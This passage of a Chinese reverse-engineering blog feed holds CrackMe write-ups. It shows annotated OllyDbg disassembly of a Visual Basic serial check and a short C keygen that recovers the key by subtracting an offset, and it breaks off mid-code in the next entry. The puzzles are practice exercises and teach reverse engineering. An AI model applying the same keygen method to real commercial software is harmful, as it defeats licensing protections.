class="hljs-number">0040494D</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>0040494E   .  FF15 D8104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="hljs-number">581</span>&gt;]     <span class="hljs-comment">;  获取第一位数字转为浮点数以便后面计算</span><br><span class="hljs-number">00404954</span>   .  DD9D 34FFFFFF <span class="hljs-keyword">fstp</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xCC</span>]<br>0040495A   .  8D4D 9C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x64</span>]<br><span class="hljs-number">0040495D</span>   .  8D55 DC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x24</span>]<br><span class="hljs-number">00404960</span>   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br><span class="hljs-number">00404961</span>   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br><span class="hljs-number">00404962</span>   .  C745 A4 <span class="hljs-number">01000</span>&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x5C</span>],<span class="hljs-number">0x1</span><br><span class="hljs-number">00404969</span>   .  C745 9C <span class="hljs-number">02000</span>&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x64</span>],<span class="hljs-number">0x2</span><br><span class="hljs-number">00404970</span>   .  FF15 AC104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaI4Var&gt;<span class="hljs-comment">;  msvbvm60.__vbaI4Var</span><br><span class="hljs-number">00404976</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br><span class="hljs-number">00404977</span>   .  8D45 BC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x44</span>]<br>0040497A   .  8D4D B8       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x48</span>]<br><span class="hljs-number">0040497D</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>0040497E   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>0040497F   .  FFD6          <span class="hljs-keyword">call</span> <span class="hljs-built_in">esi</span>                                 <span class="hljs-comment">;  msvbvm60.__vbaStrVarVal</span><br><span class="hljs-number">00404981</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br><span class="hljs-number">00404982</span>   .  FF15 4C104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="hljs-number">631</span>&gt;]     <span class="hljs-comment">;  msvbvm60.rtcMidCharBstr</span><br><span class="hljs-number">00404988</span>   .  8BD0          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">eax</span><br>0040498A   .  8D4D B4       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4C</span>]<br><span class="hljs-number">0040498D</span>   .  FF15 BC104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaStrMo&gt;<span class="hljs-comment">;  msvbvm60.__vbaStrMove</span><br><span class="hljs-number">00404993</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; /String = &quot;7&quot;</span><br><span class="hljs-number">00404994</span>   .  FF15 <span class="hljs-number">20104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="hljs-number">516</span>&gt;]     <span class="hljs-comment">; \转为ascii</span><br>0040499A   .  0FBFD0        <span class="hljs-keyword">movsx</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-number">0040499D</span>   .  <span class="hljs-number">8995</span> FCFCFFFF <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x304</span>],<span class="hljs-built_in">edx</span><br>004049A3   .  C785 7CFFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x84</span>],<span class="hljs-number">0x5</span><br>004049AD   .  DB85 FCFCFFFF <span class="hljs-keyword">fild</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x304</span>]<br>004049B3   .  DD9D F4FCFFFF <span class="hljs-keyword">fstp</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x30C</span>]<br>004049B9   .  DD85 F4FCFFFF <span class="hljs-keyword">fld</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x30C</span>]<br>004049BF   .  DC85 34FFFFFF <span class="hljs-keyword">fadd</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xCC</span>]             <span class="hljs-comment">;  每一位字符ascii码加上第一位数字</span><br>004049C5   .  DD5D <span class="hljs-number">84</span>       <span class="hljs-keyword">fstp</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x7C</span>]<br>004049C8   .  DFE0          <span class="hljs-keyword">fstsw</span> <span class="hljs-built_in">ax</span><br>004049CA   .  A8 <span class="hljs-number">0D</span>         <span class="hljs-keyword">test</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">0xD</span><br>004049CC   .  0F85 FA1F0000 <span class="hljs-keyword">jnz</span> Andréna<span class="hljs-number">.</span>004069CC<br>004049D2   .  8D85 7CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x84</span>]<br>004049D8   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>004049D9   .  FF15 <span class="hljs-number">94104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="hljs-number">572</span>&gt;]     <span class="hljs-comment">;  msvbvm60.rtcHexBstrFromVar</span><br>004049DF   .  8D4D CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>004049E2   .  <span class="hljs-number">8985</span> 74FFFFFF <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8C</span>],<span class="hljs-built_in">eax</span><br>004049E8   .  8D95 6CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x94</span>]<br>004049EE   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>004049EF   .  8D85 5CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xA4</span>]<br>004049F5   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>004049F6   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>004049F7   .  C785 6CFFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x94</span>],<span class="hljs-number">0x8</span><br>00404A01   .  FF15 <span class="hljs-number">84104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaVarCa&gt;<span class="hljs-comment">;  msvbvm60.__vbaVarCat</span><br>00404A07   .  8BD0          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">eax</span><br>00404A09   .  8D4D CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>00404A0C   .  FFD7          <span class="hljs-keyword">call</span> <span class="hljs-built_in">edi</span>                                 <span class="hljs-comment">;  msvbvm60.__vbaVarMove</span><br>00404A0E   .  8D4D B0       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x50</span>]<br>00404A11   .  8D55 B4       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4C</span>]<br>00404A14   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>00404A15   .  8D45 B8       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x48</span>]<br>00404A18   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>00404A19   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>00404A1A   .  6A <span class="hljs-number">03</span>         <span class="hljs-keyword">push</span> <span class="hljs-number">0x3</span><br>00404A1C   .  FF15 9C104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaFreeS&gt;<span class="hljs-comment">;  msvbvm60.__vbaFreeStrList</span><br>00404A22   .  8D8D 6CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x94</span>]<br>00404A28   .  8D95 7CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x84</span>]<br>00404A2E   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>00404A2F   .  8D45 8C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x74</span>]<br>00404<span class="hljs-built_in">A32</span>   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>00404A33   .  8D4D 9C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x64</span>]<br>00404A36   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>00404A37   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>00404A38   .  6A <span class="hljs-number">04</span>         <span class="hljs-keyword">push</span> <span class="hljs-number">0x4</span><br>00404A3A   .  FF15 <span class="hljs-number">14104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaFreeV&gt;<span class="hljs-comment">;  msvbvm60.__vbaFreeVarList</span><br>00404A40   .  83C4 <span class="hljs-number">24</span>       <span class="hljs-keyword">add</span> <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x24</span><br>00404A43   .  8D95 08FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xF8</span>]<br>00404A49   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; /TMPend8 = NULL</span><br>00404A4A   .  8D85 18FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xE8</span>]          <span class="hljs-comment">; |</span><br>00404A50   .  8D4D DC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x24</span>]          <span class="hljs-comment">; |</span><br>00404A53   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |TMPstep8 = 005446A4</span><br>00404A54   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |Counter8 = 00530000</span><br>00404A55   .  FF15 C8104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaVarFo&gt;<span class="hljs-comment">; \__vbaVarForNext</span><br>00404A5B   .^ E9 CFFEFFFF   <span class="hljs-keyword">jmp</span> Andréna<span class="hljs-number">.</span>0040492F<br>00404A60   &gt;  8D55 CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>00404A63   .  8D85 4CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xB4</span>]<br>00404A69   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; /var18 = NULL</span><br>00404A6A   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |var28 = 005446A4</span><br>00404A6B   .  C785 54FFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xAC</span>],Andréna<span class="hljs-number">.0040</span>&gt;<span class="hljs-comment">; |0817E747D7AFF7C7F82836D74RR7A7F7E7B7C7D826D81KE7B7C</span><br>00404A75   .  C785 4CFFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xB4</span>],<span class="hljs-number">0x8008</span>       <span class="hljs-comment">; |</span><br>00404A7F   .  FF15 5C104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaVarTs&gt;<span class="hljs-comment">; \__vbaVarTstEq</span><br></code></pre></div></td></tr></table></figure><p>继续分析发现问题，最后比较的字符串第一位基本都是081，但是获取的第一位数字最大就是9,最大的9（0x39)+9也才是42，怎么都不会是81。仔细查看发现是自己的思路出现问题了，刚才搜索字符串有许多的地方，而我直接断在第一个地方进行分析，第一个地方只获取第一位数字，而后面会获取前两位数字，这样就对了。</p><p>只看这里获取前两位数字的部分即可，其他关键计算与上面是一样的。</p><figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima"><span class="hljs-number">004064B3</span>   .  6A <span class="hljs-number">02</span>         <span class="hljs-built_in">push</span> <span class="hljs-number">0x2</span><br><span class="hljs-number">004064B5</span>   .  8D55 8C       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0x74</span>]<br><span class="hljs-number">004064B8</span>   .  <span class="hljs-number">51</span>            <span class="hljs-built_in">push</span> ecx<br><span class="hljs-number">004064B9</span>   .  <span class="hljs-number">52</span>            <span class="hljs-built_in">push</span> edx<br><span class="hljs-number">004064BA</span>   .  FFD3          call ebx                                 ;  msvbvm60.rtcLeftCharVar<br><span class="hljs-number">004064BC</span>   .  8D45 8C       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0x74</span>]<br><span class="hljs-number">004064BF</span>   .  8D4D B0       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0x50</span>]<br><span class="hljs-number">004064C2</span>   .  <span class="hljs-number">50</span>            <span class="hljs-built_in">push</span> eax<br><span class="hljs-number">004064C3</span>   .  <span class="hljs-number">51</span>            <span class="hljs-built_in">push</span> ecx<br><span class="hljs-number">004064C4</span>   .  FFD6          call esi                                 ;  msvbvm60.__vbaStrVarVal<br><span class="hljs-number">004064C6</span>   .  <span class="hljs-number">50</span>            <span class="hljs-built_in">push</span> eax<br><span class="hljs-number">004064C7</span>   .  FF15 D8104000 call dword ptr ds:[&lt;&amp;MSVBVM60.#<span class="hljs-number">581</span>&gt;]     ;  msvbvm60.rtcR8ValFromBstr<br><span class="hljs-number">004064CD</span>   .  DD9D 34FFFFFF fstp qword ptr ss:[ebp-<span class="hljs-number">0xCC</span>]<br></code></pre></div></td></tr></table></figure><p>那么只有一组是正确的对比字符串，经过上述分析可以知道，生成的字符串肯定是十六进制的值，查看字符串可以发现有许多的字符串其中不是十六进制值，比如第一组，很明显RR,KE不是十六进制数。</p><p><img src="/2021/08/16/160CrackMe-011/6.png"></p><p>分析发现只有一组数是全部都是十六进制的，那么这一组应该就是需要计算后并且比对的KEY了。下面可以开始写注册机了。</p><p><img src="/2021/08/16/160CrackMe-011/7.png"></p><h2 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h2><p>首先是对于那个每一位字符需要加上的数字的判断，假设这个数字是X，那么第一位数字就是X的十位数，然后这个数+X等于81，可以用这种方法来进行计算。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getValue</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> a,b;<br><span class="hljs-keyword">char</span> c;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0x31</span>; i &lt; <span class="hljs-number">0x3A</span>; i++)<br>&#123;<br>a = <span class="hljs-number">0x81</span> - i;<br>b = a/<span class="hljs-number">10</span>;<br><span class="hljs-built_in">itoa</span>(b, &amp;c, <span class="hljs-number">10</span>);<br><span class="hljs-keyword">if</span> ( c==i )<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, a);<br><span class="hljs-keyword">return</span> a;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>其实我这种方法不太严谨，应该是第一位等于X的十位，第二位等于X的个位，同时满足才行。</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-keyword">int</span> main()<br>&#123;<br><span class="hljs-keyword">int</span> a= getValue()<span class="hljs-comment">;</span><br><span class="hljs-keyword">int</span> key[] = &#123; <span class="hljs-number">0x81</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x7A</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-number">0x7F</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0x83</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x7A</span>,<span class="hljs-number">0x7F</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x7B</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x7B</span>,<span class="hljs-number">0x7C</span> &#125;<span class="hljs-comment">;</span><br>for (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; sizeof(key) / sizeof(int); i++)</span><br>&#123;<br>key[i] -= a<span class="hljs-comment">;</span><br>printf(<span class="hljs-string">&quot;%c&quot;</span>, key[i])<span class="hljs-comment">;</span><br>&#125;<br>return <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/16/160CrackMe-011/8.png"></p><p><img src="/2021/08/16/160CrackMe-011/9.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>因为下断的原因一直分析第一个，那里只获取第一个数字，卡了半天，研究许久让我一度以为是CM的问题，有点蠢了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h2&gt;&lt;p&gt;打开程序看到主界面，不可以输入任何字符，只可以点击下面的这个小键盘来进行输入，右边提示一个状态上面写着未注册，猜测成功的话这里应该会发生变化</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ackie.cn/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ackie.cn/tags/CrackMe/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe-010</title>
    <link href="https://b1ackie.cn/2021/08/13/160CrackMe-010/"/>
    <id>https://b1ackie.cn/2021/08/13/160CrackMe-010/</id>
    <published>2021-08-13T09:05:50.000Z</published>
    <updated>2021-08-13T09:41:52.155Z</updated>
    
    <content type="html"><![CDATA[<h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><p>打开程序，看到只有一个输入key的地方，尝试输入发现弹出错误的弹窗。</p><p><img src="/2021/08/13/160CrackMe-010/1.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>无壳，用VB语言编写的。</p><p><img src="/2021/08/13/160CrackMe-010/2.png"></p><p>使用OD打开，直接搜索错误的字符串，可以定位到关键的跳转，在上面就是一个比较函数，而其中又有一串字符串”kXy^rO|<em>yXo</em>m\kMuOn*+”，这个应该就是用来比较的了吧，函数头部下断开始分析。</p><p><img src="/2021/08/13/160CrackMe-010/3.png"></p><p>流程较短也比较简单，前面还有一个获取输入的长度，就不在分析了，直接看关键的计算部分。</p><p>获取输入的每一位KEY加上0xA形成新的KEY最后再与”kXy^rO|<em>yXo</em>m\kMuOn*+”作比较。那么用这段字符减去A就可以得到输入的key了，下面开始写注册机</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs 